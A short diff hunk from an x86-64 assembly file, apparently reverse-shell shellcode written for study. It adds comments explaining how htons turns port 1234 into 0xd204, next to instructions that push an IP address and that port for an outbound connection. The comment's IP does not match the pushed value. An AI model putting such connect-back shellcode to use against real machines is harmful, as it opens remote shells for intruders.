@@ -31,6 +31,8 @@ mov rdi, rax
 ; 172.22.174.36 is \x24\xae\x16\xac which is doubleword
 ; Push from bottom up since it is in a stack and a pointer reference
 ; htons of port 1234 is python -c "hex(socket.htons(1234))" which is 0xd204
+; htons effective changes value of the argument into  hex form and returning in little endian format.
+; In this case,port 1234 is changed to 0x4d2 and little endian format is 0xd204
 
 push dword 0x0101a8c0  
 push word 0xd204 
